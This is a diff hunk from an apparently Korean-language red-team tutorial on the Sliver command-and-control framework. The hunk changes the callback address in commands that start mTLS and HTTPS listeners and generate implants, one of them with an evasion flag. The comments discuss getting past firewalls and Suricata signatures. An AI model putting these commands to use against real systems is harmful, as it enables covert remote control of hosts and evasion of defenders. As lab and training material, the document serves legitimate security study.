@@ -738,17 +738,17 @@ graph LR
 ```bash
 # === 1. mTLS (가장 안전 — 인증서 검증) ===
 sliver-server
-sliver > mtls --lhost 192.168.0.112 --lport 443
-sliver > generate --mtls 192.168.0.112:443 --save /tmp/sliver-mtls
+sliver > mtls --lhost 10.20.30.202 --lport 443
+sliver > generate --mtls 10.20.30.202:443 --save /tmp/sliver-mtls
 
 # 장점: TLS + client cert → 가짜 server 차단
 # 단점: 시그니처 (Suricata 가 알려진 sliver TLS pattern 탐지 가능)
 
 # === 2. HTTP/S (방화벽 우회 — 80/443 만 열려있을 때) ===
-sliver > https --lhost 192.168.0.112 --lport 443
+sliver > https --lhost 10.20.30.202 --lport 443
 
 # Target — 정상 web traffic 처럼 위장
-sliver > generate --https 192.168.0.112:443 --save /tmp/sliver-https \
+sliver > generate --https 10.20.30.202:443 --save /tmp/sliver-https \
     --evasion                                              # 시그니처 회피
 
 # === 3. DNS (가장 은닉 — DNS 만 외부 허용) ===
